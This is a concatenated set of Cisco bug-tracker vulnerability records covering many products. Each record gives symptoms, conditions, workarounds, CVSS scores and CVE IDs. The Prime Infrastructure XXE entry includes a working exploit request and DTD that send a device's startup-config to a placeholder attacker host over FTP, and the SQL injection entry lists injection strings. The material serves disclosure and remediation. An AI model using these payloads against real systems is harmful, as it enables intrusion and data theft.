RNE: Symptom: A vulnerability in the process management code of the Cisco TelePresence Video Communication Server (VCS) Expressway could allow an authenticated, local attacker to run arbitrary programs with elevated privileges.  The vulnerability is due to the failure to protect a supervised process. An attacker could exploit this vulnerability by completing a series of steps which ultimately allows a lower-privileged process to be restarted with root privilege. An attacker would need to be able to crash a firestarter.py supervised process before the privilege is escalated after the process is restarted. A successful exploit could allow the attacker to gain elevated privileges on the device which could result in a complete system compromise.  Conditions: Device running with default configuration.  Workaround: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 6.6/5.9: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:L/AC:M/Au:S/C:C/I:C/A:C/E:POC/RL:U/RC:C&version=2.0 CVE ID CVE-2015-4325 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  Further Problem Description:

Title: Devices > Platform Settings - reflective XSS, which unauthenticated user
RNE: Symptom: The Cisco FireSIGHT System Software does not properly sanitize or encode user-supplied data.  This makes the web interface vulnerable to reflected cross-site scripting (XSS) attacks.  Conditions: Device running with default configuration running an affected version of software.   Note : This Happens only when the FMC does not have any devices added.  Workaround: None. Title: sensorApp process hangs due to job failure in Regex Hardware
RNE: Symptom: When one of the following operations are attempted on IPS sensor, it is found that sensorApp process is found to hang or become unresponsive: - Signature upgrade - Global correlation  - ''show statistics anomaly-detection'' command - ''clear database'' command  After this situation occurs, the sensorApp does not respond to any further commands or control transactions. Issuing a command like ''show statistics  virtual-sensor'' will not return any output and the command will time out after some time.  The mainApp finds that sensorApp is not responding to the collectStatistics control transactions that it sends, and hence logs the following error  message in main.log: ''collectStatistics failed: System error: Could not get user mode interface statistics [IntfManager::IntfcManager]''    In case of Global Correlation request leading to the hang, the evStatus ''Beginning to install a global-correlation update'' occurs, but the ''A global- correlation update installed successfully'' evStatus does NOT occur.  Conditions: Firing the control transaction ''getENGVirtualSensorStatistics'' before any of the above operations will show up a job failure. For example, from the service account, firing the following command before one of the above commands '/usr/cids/idsRoot/bin/sendCtlTrans getENGVirtualSensorStatistics' will report 1 'regex hardware search job failed'  This is applicable only to platforms having Regex Hardware, which includes the following IPS models: IPS 4510, IPS 4520 SSP10, SSP20, SSP40, SSP60 ASA 5525-X, ASA 5545-X, ASA 5555-X (with SSP running IPS); IPS 4345, IPS 4360  Note: The mere presence of collectStatistics failed errors in main.log does NOT indicate that this bug is hit. It is a generic error that would be logged  when sensorApp would become unresponsive to control transactions. Sometimes, sensorApp is unresponsive for a short while to mainApp, which  can mislead to mainApp to log collectStatistics errors. Also, the collectStatistics errors may be logged for reasons other than the specific issue related  to this DDTS. This bug is indicated by jobFailure in regex hardware when control transaction ''getENGVirtualSensorStatistics''' is triggered    Usage of any Signature packs between S673 to S687  Workaround: Reboot the sensor, and  Disable string-tcp, string-tcp-xl engines or disable signatures associated with these engines  If using any signature packs between S673 to S687, it is recommended to migrate to S688 or higher  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are  4.4/3.6: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:L/AC:M/Au:S/C:N/I:N/A:C/E:F/RL:OF/RC:C&version=2.0 CVE ID CVE-2013-1219 has been assigned to document this issue.  Additional details about the vulnerability described here can be found at: http://tools.cisco.com/security/center/content/CiscoSecurityNotice/CVE-2013-1219  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  Further Problem Description:
Description: The sensorApp process is unresponsive (does not generate alerts or respond to commands like ;show stat virt;).  The main.log shows many of the following errors: ;collectStatistics failed: System error: Could not get user mode interface statistics [IntfcManager::IntfcManager];Some of these failures appear to follow a GC update and never completes: evStatus ;Beginning to install a global-correlation update;, but the following ;A global-correlation update installed successfully; evStatus does NOT occur.;collectStatistics  failed: System error: Could not get user mode interface statistics [IntfcManager::IntfcManager];This errror is thrown from the interfaceApp when it tries to reach the sensorApp .This indicates that the sensorApp is not responsive.

Title: Cisco IOS XR OSPF Link State Advertisement PCE Vulnerability
RNE: Symptoms: vulnerability in Open Shortest Path First (OSPF) Link State Advertisement (LSA) handling of the Cisco IOS XR Software could allow an unauthenticated, remote attacker to cause a  denial of service (DoS).  The vulnerability is due to the number of OSPF Path Computation Elements (PCEs) configured  for a OSPF LSA opaque area update. An attacker could exploit this vulnerability by sending  a crafted OSPF LSA update to an affected device running the vulnerable software and  configuration. An exploit could allow the attacker to cause a DoS due to the OSPF process restarting  when the crafted OSPF LSA update is received.  Conditions: The device is configured for OSPF and there are more than 10 OSPF PCEs configured in an OSPF area which needs to be flooded by OSPF in the opaque area LSA.  Workaround: Verify that there are not more than 10 PCEs configured in a single OSPF area.  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 5/4.1: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:N/C:N/I:N/A:P/E:F/RL:OF/RC:C&version=2.0 CVE ID CVE-2015-6432 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Cisco WebEx Meeting Center Site Redirection Vulnerability
RNE: Symptom: A vulnerability in a specific URL parameter of Cisco WebEx could allow an unauthenticated, remote attacker to perform site redirection.   The vulnerability is due to insufficient input validation. An attacker could exploit this vulnerability by including a desired remote site URL in the affected parameter of the Cisco WebEx URL. An exploit could allow the attacker to redirect a user to a malicious website.   To exploit the vulnerability, the attacker may provide a link that directs a user to a malicious site and use misleading language or instructions to persuade the user to follow the provided link.  Conditions: A Cisco WebEx Meeting Center running a release prior to T28, or any releases that have not had the ?Enforce BACKURL Domain Names? selection checked.  Workaround: Currently, customers may contact WebEx Support to request that the ?Enforce BACKURL Domain Names? selection be checked to disable redirection. In later releases, customers will be able to configure this functionality from the Administrator panel.  Further Problem Description: This vulnerability was reported by Lawrence Amer.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 5:  https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-3799 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: CUIC Distributed denial-of-service vulnerability on NTP server
RNE: Symptom: A vulnerability in Network Time Protocol (NTP) package of Cisco CUIC Software could allow an unauthenticated, remote attacker to  cause a Denial of Service (DoS) condition on an affected device.  The vulnerability is due to processing of MODE_PRIVATE (Mode 7) NTP control messages which have a large amplification vector. An attacker could  exploit this vulnerability by sending Mode 7 control requests to NTP servers and observing responses amplified up to 5500 times in size. An exploit  could allow the attacker to cause a Denial of Service (DoS) condition where the affected NTP server is forced to process and respond with large  response data.  Conditions: All releases  Workaround: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are  5/4.8: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:N/C:N/I:N/A:P/E:F/RL:U/RC:C&version=2.0 CVE ID CVE-2013-5211 has been assigned to document this issue.  Additional details about the vulnerability described here can be found at: http://tools.cisco.com/security/center/content/CiscoSecurityNotice/CVE-2013-5211  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  Further Problem Description:
Description: Network Time Protocol (NTP) Amplification attack is used to perform a Distributed Denial of Service (DDoS) that relies on the use of publicly accessible NTP servers to overwhelm a victim system with UDP traffic.http://tools.cisco.com/security/center/content/CiscoSecurityNotice/CVE-2013-5211https://access.redhat.com/security/cve/CVE-2013-5211 states:;The monlist feature in ntp_request.c in ntpd in NTP before 4.2.7p26 allows remote attackers to cause a denial of service (traffic amplification) via forged (1) REQ_MON_GETLIST or (2) REQ_MON_GETLIST_1 requests, as exploited in the wild in December 2013.;The output of 'show packages active ntp' for CUIC:admin:show packages active ntpActive Side Package(s): for ntp package(s)ntp-4.2.0.a.20040617-8.el4_8.1

Title: Cisco StarOS for Cisco ASR 5000 Series IPSECMGR Service Denial of Service Vulnerability
RNE: Symptoms: A vulnerability in the IPSec component of StarOS for Cisco ASR5000 Series routers could allow an unauthenticated, remote attacker to cause a reload of the iipsecmgr/i process.  The vulnerability is due to improper processing of Internet Key Exchange (IKE) messages. An attacker could exploit this vulnerability by sending crafted IKE messages towards the router. An exploit could allow the attacker to cause a reload the iipsecmgr/i process. A reload of the iipsecmgr/i service might result in all IPSec VPN tunnels to be terminated and unable to reestablish until the process has restarted, resulting in a denial of service (DoS) condition.  Conditions: Cisco ASR 5000 Series router with IPSec VPN configured.  Workaround: There are no workarounds that address this vulnerability.  Further Problem Description: This vulnerability was found during internal testing.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 5/4.1: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:N/C:N/I:N/A:P/E:F/RL:OF/RC:C&version=2.0  CVE ID CVE-2016-6466 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Cisco ESA Messages in Quarantine Email Rendering Vulnerability
RNE: Symptoms: A vulnerability in the display of email messages in the Messages in Quarantine (MIQ)  view in Cisco AsyncOS for Cisco Email Security Appliance (ESA) could allow an unauthenticated,  remote attacker to cause a user to click a malicious link in the MIQ view. The malicious link could  be used to facilitate a cross-site scripting (XSS) or HTML injection attack.   The vulnerability is due to malformed HTML script tags in quarantined email messages. An attacker  could exploit this vulnerability by sending a crafted email message to the affected device. An exploit  could allow the attacker to trick a user who views the MIQ email message into clicking a malicious link.   Conditions: All ESA versions are vulnerable until the first fixed.  Workaround: None.  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4.3/3.6: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:N/I:P/A:N/E:F/RL:OF/RC:C&version=2.0  CVE ID CVE-2016-1423 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: ESA HTML injection in quarantined email subject renderingThe IronPort Quarantine is not properly displaying email subjects in the ;Messages in Quarantine; (MIQ) view, resulting in possible HTML injection (HTMLi) and Cross Site Scripting (XSS). This is a critical vulnerability that could result in compromise when attackers send specially crafted emails.Affected OS: ESA Async OS 8.0.2-069 (This issue is not present on SMA AsyncOS 8.1.1-013)Requested Action: Properly encode the email subject to prevent this vulnerability. Fixes must be incorporated into a Common Criteria/NIAP certified build for use by DoD. For details see big_description enclosure.

Title: Cisco Prime Infrastructure and Evolved Programmable Network Manager XML Injection Vulnerability
RNE: Symptom: A vulnerability in the web based user interface of Cisco Prime Infrastructure (PI) and Evolved Programmable  Network Manager (EPNM) could allow an authenticated, remote attacker to have have read and write access to information stored in the affected system as well as perform remote code execution.  The vulnerability is due to improper handling of XML External Entity (XXE) entries when parsing an XML file.  An attacker could exploit this vulnerability by convincing the administrator of an affected system to import a  crafted XML file with malicious entries which could allow the attacker to read and write files and execute remote  code within the application.  Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability.    This advisory is available at the following link:  https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170621-piepnm  Conditions: Please refer to the Security Advisory.  Workaround: Please refer to the Security Advisory.  Further Problem Description: Please refer to the Security Advisory.  PSIRT Evaluation:  Credit: Cisco would like to thank Pichaya Morimoto (discovery, analysis, coordination) from the SEC Consult Vulnerability  Lab for responsibly reporting the identified vulnerability.  The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 8.8: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X  CVE ID CVE-2017-6662 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: Security researcher warns of XML External Entity Injection Vulnerability:Please see Cisco PI bug:CSCvc23894  - V in 3.2, 3.1.6 in tobefixed, need to bring fix in EPNM, fix details in code review.p1 enclosure, The vulnerability can be exploited by low privilege read-only user to read sensitive information files with malicious XML code.The hashed password of the local admin user can be accessed withoutauthorization.Login with a low privileged user and navigate to Settings > Export > select Format 'PDF' click 'Export'.Make sure the 'Chart' option is selected, this chart uses XML to build SVGimages.POST /webacs/prime/ui/dashboard/renderer HTTP/1.1Host: <CiscoPrimeHost>[...]output-type=pdf&content={;applicationName;:;sectest;,;reportName;:;Site;,;options;:{},;timezoneOffset;:0,;items;:[{;options;:{;filters;:[],;additionalInfo;:[;;]},;svgSurface;:{;svg;:;<%3fxml+version%3d\;1.0\;+encoding%3d\;UTF-8\;%3f><!DOCTYPE x [<!ENTITY %25 foo SYSTEM \;http://<AttackerHost>:1234/sectest.dtd\;>%25%66%6f%6f%3b%25%70%61%72%61%6d%31%3b]><svg+xmlns%3alink%3d\;http%3a//www.w3.org/1999/xlink\;+xmlns%3d\;http%3a//www.w3.org/2000/svg\;><defs/><text>%26%65%78%66%69%6c%3b</text></svg>;,;dims;%3a{;width;%3a0,;height;%3a0}},;csv;%3a;Devices,\;;,;title;%3a;;,;timestamp;%3a;;}],;noBrandingData;%3atrue,;locale;%3a;en;}&pdfOptions=%7B%22table%22%3Atrue%2C%22chart%22%3Atrue%7D$ cat sectest.dtd<!ENTITY % data SYSTEM ;file:///storedconfig/active/startup-config;><!ENTITY % param1 ;<!ENTITY exfil SYSTEM 'ftp://<Attacker>:2121/%data;'>;>$ python -m SimpleHTTPServer 1234$ wget https://raw.githubusercontent.com/ONsec-Lab/scripts/master/xxe-ftp-server.rb$ ruby xxe-ftp-server.rbFTP. Title: XSS possible in "Core Dumps" and "Console Logs" sections of web app
RNE: Symptom: A vulnerability in the web application of the Cisco IP Phone 8800 Series could allow an authenticated, remote attacker to a stored, cross-site scripting (XSS) attack.  The vulnerability is due to insufficient sanitization of parameter values.  An attacker could exploit this vulnerability by storing malicious code on a device and then waiting for a user to access a webpage that triggers the execution of malicious code. An exploit could allow the attacker to execute arbitrary script code in the context of the web interface on the affected device.  Conditions: Device configured with default configuration.  Workaround: None.   PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4/3.8: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:S/C:N/I:P/A:N/E:F/RL:U/RC:C&version=2.0 CVE ID CVE-2016-1476  has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  Further Problem Description:
Description: DESCRIPTIONThe ;Console Logs; and ;Core Dumps; sections of the web applicationlist the contents of '/var/log/' and '/usr/local/backtraces' respectively.The filenames are not sanitized for special characters that can beused to insert javascript or html into the website displaying them.IMPACTAn attacker who manages to create a file in these directories will be able to insert malicious javascript into the web application. This can result in disclosure of private cookies as well as potentially create a platform for further attacks.SUGGESTED REMEDIATIONXSS protection should be enabled on all sections of the webapplication. The web application should never display input coming from an outside source without being properly inspected and sanitized first.

Title: CDP packet causes switch to crash due unexpected exception to CPUvector
RNE: Symptom: A vulnerability in processing of CDP packets of Cisco IOS for Cisco Industrial Ethernet 2000 Series Switches could allow an unauthenticated, adjacent attacker to  cause a reload of the affected device.  The vulnerability is due to improper processing of crafted CDP packets. An attacker could exploit this vulnerability by sending a crafted CDP packet to an affected  device. An exploit could allow the attacker to cause a reload of the affected device.  Conditions: Device configured with CDP. The following similar messages may be printed on the console:    22:59:34 PDT Sun Jan 1 2006: Unexpected exception to CPUvector 1100, PC = 33CE3C   -Traceback= 0x33CE3Cz 0x330F48z 0x327F50z 0x32D32Cz 0x300F194z 0x300B0F4z  Workaround: None.   PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 6.1/5.8: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:A/AC:L/Au:N/C:N/I:N/A:C/E:F/RL:U/RC:C&version=2.0  CVE ID CVE-2016-1330 has been  assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  Further Problem Description:
Description: Cody is connected to IE2k .  Issuing a single CDP packet with spare pair PoE param, via Cody PCAP Fuzzer functionality by importing a given PCAP file, causes UUT to crash immediately resulting in the following decoded tracebacks.0x33CE3C:cdp_notify_location_status_shim(0x33cd6c)+0xd00x330F48:cdp_insert_packet_info(0x330a50)+0x4f80x327F50:cdp_handle_packet(0x327750)+0x8000x32D32C:cdp_prot(0x32cc90)+0x69c0x300F194:ppc_process_dispatch(0x300f170)+0x240x300B0F4:process_execute(0x300ae84)+0x270Topology:Cody (00:c0:de:39:cf:9d) ------- (c0:8c:60:f7:41:42, fastethernet 1/10) IE2000Beni_MRC1_Cody#Crash symptom: 22:59:34 PDT Sun Jan 1 2006: Unexpected exception to CPUvector 1100, PC = 33CE3C  -Traceback= 0x33CE3Cz 0x330F48z 0x327F50z 0x32D32Cz 0x300F194z 0x300B0F4z Writing crashinfo to flash:/crashinfo_ext/crashinfo_ext_5This crash was observed on the followiing 3 platform/image combos:IE2000:  15.2(4.1.37)EA1,  15.2(4.1.57)EA1IE4000:  15.2.(2)EAC3750: 15.2-2.EIt does NOT occur with CGR1240 after 53k test interations were executed:CGR1240:  156-1.T0aBasically this problem is seen on switches not routers and goes back as far as 15.2(2).Also this CSC.sys ddts is a dup of CSCuy26891 which was erroneously opened as CSC.labtrunk earlier

Title: IPS sends user credential in clear text during automatic sign. update
RNE: Symptom:  During automatic signature update, after connecting to the Cisco website using https, IPS is redirected to the download server using plain http (as expected and documented), but authentication is performed again, and the sensor sends cisco.com user credentials in clear text.  Conditions: IPS configured for automatic update  Workaround:  A possible workaround is to configure auto update for local server. PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4.3/4.1: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:P/I:N/A:N/E:F/RL:U/RC:C&version=2.0 CVE ID CVE-2012-3067 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: ACI : ARP storm on l3out blocks ARP reponses to infra pool
RNE: Symptoms: The iStack does not provide adequately process a large volume of ARP messages and puts the processing to the CPU. This can cause the system to appear to become unresponsive during an ARP-storm. The system will recover when the ARP-storm passes.   Symptom: APIC unable to resolve ARP requests when there are a large number of ARP messages.  Conditions: A large number of ARP messages must be present on the VLAN.  Workaround: None  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 3.3/2.6: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:A/AC:L/Au:N/C:N/I:N/A:P/E:POC/RL:OF/RC:C&version=2.0 No CVE ID has been assigned to this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: leaf 101 running 11.0(4h)  has l3out on eth1/19. tested with 11.0(3f) with same result.There is 1360 ARPs/sec incoming with encap 1932 over that l3out, which get punted to CPU.As consequence, leaf 101 will not respond to ARPs from APICs on Infra VLAN ... which basically brings the APIC cluster down since APIC servers aren't able to reach each other nor switches in infra vlan (in particular case, all 3 APICs are connected to the same leaf 101).Finally, whole APIC cluster is down because of ARP storm on L3out.If ARP storm on L3out is stopped, cluster comes online and whole infra is reachable again.It looks that iStack is quite vulnerable to ARP storms. I though we should somehow isolate infra VLAN from other interfaces.
PSIRT: PSIRT-owner: jklimarc           PSIRT is reviewing this issue for possible inclusion in a Cisco Security  Advisory which could include this DDTs. Title: Cisco  Prime Collaboration Deployment SQL Injection Vulnerability
RNE: Symptom: A vulnerability in the Cisco Prime Collaboration Deployment SQL database  interface could allow an authenticated, remote attacker to impact the   confidentiality of the system by executing arbitrary SQL queries.  The vulnerability is due to a lack of input validation on user-supplied input within  SQL queries. An attacker could exploit this vulnerability by sending crafted URLs that  contain malicious SQL statements to the affected system. An exploit could allow the  attacker to determine the presence of certain values in the database.  Conditions: Default configuration of system running affected version.  Workaround: None.  Further Problem Description:  For additional information please refer to:  https://www.owasp.org/index.php/SQL_Injection  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4/3.3: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:S/C:P/I:N/A:N/E:F/RL:OF/RC:C&version=2.0 CVE ID CVE-2016-1437 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: PCD: SQL Injection on UpgradeFilesListThe following SQL Injection exist on PCD:URL: https://202.1.1.14/ucmap/rest/upgradefileslist/connectionParameter: username;Attack:  root AND 1=1 ?Evidence:The page results were successfully manipulated using the boolean conditions [root AND 1=1 -- ] and [root AND 1=2 -- ]The parameter value being modified was NOT stripped from the HTML output for the purposes of the comparisonData was returned for the original parameterThe vulnerability was detected by successfully restricting the data originally returned through manipulating the parameter Also noted similar findings for the following parameters on the same URL:Parameter: password;Attack: cisco_123 AND 1=1 --Parameter: desc;Attack: test AND 1=1 -- Parameter: status;Attack: Not Connected AND 1=1 --

Title: Cisco Packet Data Network Gateway (PGW) IP Stack Vulnerability
RNE: Symptoms: A vulnerability in Internet Protocol (IP) stack of the Cisco Packet Data Network Gateway (PGW)  could allow an unauthenticated, remote attacker to cause a partial denial of service (DoS) of the  Session Manager service of the PGW when a malformed IP packet is received.  The vulnerability is due to improper input validation of certain fields in the IP packet. An attacker could exploit this vulnerability by crafting a malformed IP packet and sending it to the affected device. An exploit  could allow the attacker to cause a DoS of the Session Manager service of the PGW. When the Session  Manger is restarted the session data is recovered.  Conditions: The PGW is configured with the command:    tcp mss 1400 limit-if-present add-if-not-present  Workaround: This is a proposed workaround which has not been validated for each case in which this crash can occur but is given to help with mitigation.  For each - ip access-list'' add the following redirect rule:    redirect css service service_name tcp any any [before the any (Redirect All) rule]  The above rule should be first in access-list. If other rules needs to be match before the  tcp any rule then this workaround is not applicable.  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are  5/4.1: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:N/C:N/I:N/A:P/E:F/RL:OF/RC:C&version=2.0 CVE ID CVE-2015-4273 has been assigned to document this issue. Title: Cisco Wireless LAN Controller Management GUI Denial of Service Vulnerability
RNE: Symptom: A vulnerability in the web management interface of Cisco Wireless LAN Controller (WLC) Software could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition on an affected device.  The vulnerability is due to a missing internal handler for the specific request. An attacker could exploit this vulnerability by accessing a specific hidden URL on the web management interface. A successful exploit could allow the attacker to cause a reload of the device, resulting in a DoS condition.  Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability.  This advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170405-wlc3  Conditions: Please refer to the Security Advisory.  Workaround: Please refer to the Security Advisory.  Further Problem Description: Please refer to the Security Advisory.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Able to arbitrarily change user account passwords
RNE: Summary A vulnerability exists in some Cisco Secure Access Control System (ACS)  versions that could allow a remote, unauthenticated attacker to change the password of any user account to any value without providing the account's  previous password. Successful exploitation requires the user account to be defined on the internal identity store.  This vulnerability does not allow an attacker to perform any other changes to  the ACS database. That is, an attacker cannot change access policies, device properties, or any account attributes except the user  password.  Cisco has released free software updates that address this vulnerability.  There is no workaround for this vulnerability.  This advisory is posted at http://www.cisco.com/warp/public/707/cisco-sa- 20110330-acs.shtml  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The  Base and Temporal CVSS scores as of the time of evaluation are 5/4.4: http://tools.cisco.com/security/center/cvssCalculator.x?vector=&version=2.0 dispatch=1&version=2&vector=AV:N/AC:L/Au:N/C:N/I:P/A:N/E:H/RL:OF/RC:C  CVE ID CVE-2011-0951 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found  at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.htm l
Description: A vulnerability has been reported affecting ACS v5.1 and ACS v5.2 which allows an unauthenticated, remote attacker to change the password for any user defined on the ACS server, without having to provide the current credentials.We're withholding the details in order to prevent exploitation - full details to be provided to the DE in charge of fixing the bug.

Title: Cisco Unity Connection unauthorized access vulnerability
RNE: Symptom: A vulnerability in the upgrade mechanism of Cisco collaboration products based on the Cisco Voice Operating System software platform could allow an unauthenticated, remote attacker to gain unauthorized, elevated access to an affected device.  The vulnerability occurs when a refresh upgrade or Prime Collaboration Deployment (PCD) migration is performed on an affected device. When a refresh upgrade or PCD migration is completed successfully, an engineering flag remains enabled and could allow root access to the device with a known password.  If the vulnerable device is subsequently upgraded using the standard upgrade method to an Engineering Special Release, service update, or a new major release of the affected product, this vulnerability is remediated by that action.  Note: Engineering Special Releases that are installed as COP files, as opposed to the standard upgrade method, do not remediate this vulnerability.  An attacker who can access an affected device over SFTP while it is in a vulnerable state could gain root access to the device. This access could allow the attacker to compromise the affected system completely.  Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability.   This advisory is available at the following link:  https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20171115-vos  Conditions: Devices running an affected Voice Operating System platform and have met the conditions to be vulnerable are affected.  Workaround: None.  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 9.8: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X  CVE ID CVE-2017-12337 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: Cisco VOSS based products that have undergone a Refresh or PCD upgrade may contain a default root password.  This account may be leveraged to completely compromise the device.

Title: PSIRT: Warn end users when spoofing possibly invalid certificate
RNE: Symptoms: Cisco IronPort Web Security Appliance (WSA) software contains a vulnerability that could allow an unauthenticated, remote attacker to conduct man- in-the-middle attacks against a targeted system.  The vulnerability is in the insecure SSL implementation of the affected operating system due to improper handling of SSL and Transport Layer Security  (TLS) security certificates.  The affected implementation could insecurely validate the certificate authority (CA) hierarchy and could trust illegitimate  certificates.  An unauthenticated, remote attacker could exploit the vulnerability by using a legitimate certificate to generate a security certificate for a third-party  domain.  The attacker would then attempt to convince an affected user to visit the domain and establish an SSL connection with the domain by using  the certificate provided. A successful attack could allow the attacker to conduct a man-in-the-middle attack against the affected user.  Conditions: Default configuration  Workaround: Administrators may consider configuring the WSA to drop invalid certificates.  Administrators are advised to contact the vendor regarding future updates and releases.  Administrators are advised to allow only trusted users to have network access.  Administrators may consider using IP-based access control lists (ACLs) to allow only trusted systems to access the affected systems.  Administrators are advised to monitor affected systems.   PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are  4.3/3.9: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:A/AC:M/Au:N/C:P/I:P/A:N/E:F/RL:W/RC:C&version=2.0 CVE ID CVE-2012-1326 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: [Feature Request] PSIRT: Warn end users when spoofing possibly invalid certificate When decrypting HTTPS sites with invalid certificates, the end user is unaware of the invalid certificate because the WSA re-encrypts the traffic with the self-signed certificate. The customer would like the option for the WSA to present the end users with a notification or warning page regarding invalid certificates of the desired HTTPS page.

Title: Cisco ACS Reflective XSS Vulnerability
